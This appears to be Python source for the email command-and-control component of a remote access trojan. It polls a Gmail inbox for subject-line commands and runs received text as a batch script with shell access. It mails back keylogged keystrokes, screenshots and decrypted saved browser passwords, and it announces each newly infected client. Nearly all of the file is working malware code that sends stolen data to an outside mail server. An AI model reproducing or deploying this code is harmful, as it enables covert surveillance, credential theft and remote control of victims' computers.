import smtplib
import os
import subprocess
import email
from email.message import EmailMessage
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText

import datetime
import pyautogui
import imaplib

import cdump


class EmailManager:

    def __init__(self, email, password, id):
        self.email = email
        self.password = password
        self.id = id
        self.keys = []

    def scheduled_check(self):
        print("scheduled check")

        imap_server = imaplib.IMAP4_SSL("imap.gmail.com", 993)
        imap_server.login(self.email, self.password)
        imap_server.select("inbox")
        _, msg_nums = imap_server.search(None, "ALL")

        # making every msg in inbox readable
        for msg_num in msg_nums[0].split():
            _, data = imap_server.fetch(msg_num, "(RFC822)")

            message = email.message_from_bytes(data[0][1])

            if message.get('Subject') == "give" + " " + self.id:
                self.give_command_response(imap_server, msg_num)
            elif message.get('Subject') == "screenshot" + " " + self.id:
                self.screenshot_command_response(imap_server, msg_num)
            elif message.get('Subject') == "dump" + " " + self.id:
                self.dump_command_response(imap_server, msg_num)
            elif message.get('Subject') == "execute" + " " + self.id:
                try:
                    self.execute_command_response(imap_server, msg_num, message)
                except Exception as e:
                    self.send_text(imap_server, msg_num, "[-] Error: " + str(e))
                    imap_server.store(msg_num, "+FLAGS", "\\Deleted")

        imap_server.expunge()
        imap_server.close()

    def execute_command_response(self, imap_server, msg_num, message):
        print("execute command")

        command = ""
        if message.is_multipart():
            for part in message.walk():
                content_type = part.get_content_type()
                content_disposition = str(part.get('Content-Disposition'))
                if "attachment" not in content_disposition:
                    if content_type == "text/plain":
                        command += part.get_payload(decode=True).decode()
        else:
            command = message.get_payload(decode=True).decode()

        with open("script.bat", "w") as file:
            file.write(command)

        msg = EmailMessage()
        msg['to'] = self.email
        msg['subject'] = self.id + "'s output from provided shell input: " + command.replace("\r", "").replace("\n", "")
        msg['from'] = self.email
        try:
            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n[*] Output: \n\n" + str(subprocess.check_output("script.bat", shell=True, text=True)))
        except Exception as e:
            print(f"ERROR: {e}")

        self.send_email(msg)
        print("email sent")

        imap_server.store(msg_num, "+FLAGS", "\\Deleted")
        print("email prompt removed")

    # keys and screenshots from when certain important keys are pressed, like @
    def give_command_response(self, imap_server, msg_num):
        print("give command")
        msg = EmailMessage()
        msg['to'] = self.email
        msg['subject'] = self.id + "'s keylog info"
        msg['from'] = self.email
        try:
            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n[+] Keys: \n\n" + str(self.keys) + "\n\n[*] Screenshots: ")
        except Exception as e:
            print(f"ERROR: {e}")

        try:
            msg.make_mixed()
            for i in range(len(os.listdir("logs"))):
                image = open(f"logs/det{str(i + 1)}.jpg", 'rb')
                att = MIMEImage(image.read())
                att.add_header('Content-Disposition', 'attachment', filename=str(image))
                msg.attach(att)
        except Exception as e:
            print(f"ERROR: {e}")
        self.send_email(msg)
        image.close()
        print("email sent")

        imap_server.store(msg_num, "+FLAGS", "\\Deleted")
        print("email prompt removed")
        for i in range(len(os.listdir("logs"))):
            os.remove(f"logs/det{i + 1}.jpg")

    def screenshot_command_response(self, imap_server, msg_num):
        print("screenshot command")
        shot = pyautogui.screenshot()
        print("saved")
        shot.save(f"ss/sc.jpg")

        msg = EmailMessage()
        msg['to'] = self.email
        msg['subject'] = self.id + "'s picture"
        msg['from'] = self.email
        try:
            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n[*] Screenshot: ")
        except Exception as e:
            print(f"ERROR: {e}")

        msg.make_mixed()
        image = open(f"ss/sc.jpg", 'rb')
        att = MIMEImage(image.read())
        att.add_header('Content-Disposition', 'attachment', filename=str(image))
        msg.attach(att)
        self.send_email(msg)
        print("email sent")
        image.close()

        imap_server.store(msg_num, "+FLAGS", "\\Deleted")
        print("email prompt removed")
        for i in range(len(os.listdir("ss"))):
            os.remove(f"ss/sc.jpg")

    def dump_command_response(self, imap_server, msg_num):
        print("dump command")
        msg = EmailMessage()
        msg['to'] = self.email
        msg['subject'] = self.id + "'s cached info"
        msg['from'] = self.email
        try:
            msg.set_content("\n[*] Date: " + str(datetime.datetime.now()))
        except Exception as e:
            print(f"ERROR: {e}")

        try:
            msg.make_mixed()
            cdump.run()
            with open(f"decrypted_password.csv", 'rb') as file:
                msg.attach(MIMEApplication(file.read(), Name="decrypted"))
        except Exception as e:
            print(f"ERROR: {e}")
        self.send_email(msg)
        print("email sent")

        imap_server.store(msg_num, "+FLAGS", "\\Deleted")
        print("email prompt removed")
        os.remove("decrypted_password.csv")

    def send_setup(self, first_time):
        shot = pyautogui.screenshot()
        print("saved")
        shot.save(f"ss/sc.jpg")

        msg = EmailMessage()
        msg['to'] = self.email
        msg['subject'] = "New client created | ID: " + self.id if first_time else "Old client started | ID: " + self.id
        msg['from'] = self.email
        try:
            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n[*] Screenshot: ")
        except Exception as e:
            print(f"ERROR: {e}")
        msg.make_mixed()
        image = open(f"ss/sc.jpg", 'rb')
        att = MIMEImage(image.read())
        att.add_header('Content-Disposition', 'attachment', filename=str(image))
        msg.attach(att)
        self.send_email(msg)
        image.close()
        print("setup email sent")

    def send_text(self, imap_server, msg_num, text):
        print("send text command (probably due to an error)")

        msg = EmailMessage()
        msg['to'] = self.email
        msg['subject'] = self.id + " has sent us something! (likely an error): "
        msg['from'] = self.email
        try:
            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n" + text)
        except Exception as e:
            print(f"ERROR: {e}")

        self.send_email(msg)
        print("email sent")

    def send_email(self, msg):
        smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
        smtp_server.starttls()
        smtp_server.login(self.email, self.password)
        smtp_server.send_message(msg)
        smtp_server.quit

    def receive_email(self, fromWho):
        imap_server = imaplib.IMAP4_SSL("imap.gmail.com", 993)
        imap_server.login(self.email, self.password)
        imap_server.select("inbox")
        _, msg_nums = imap_server.search(None, "ALL")

        # making every msg in inbox readable
        for msg_num in msg_nums[0].split():
            _, data = imap_server.fetch(msg_num, "(RFC822)")
            message = email.message_from_bytes(data[0][1])
            if message.get('From').split('<')[1].split('>')[0] == fromWho:
                print("Message #: ", msg_num)
                print("From: ", message.get('From'))
                print("Date: ", message.get('Date'))
                print("Subject: ", message.get('Subject'))
                print("Body: ", end="")
                for part in message.walk():
                    if part.get_content_type() == "text/plain":
                        print(part.as_string())
        imap_server.close()


if __name__ == '__main__':
    # NewEmail("@vtext.com", "Test!", "This was a test.")    .split('<')[1].split('>')[0]
    manager = EmailManager("email", "password", 2037)
    manager.receive_email()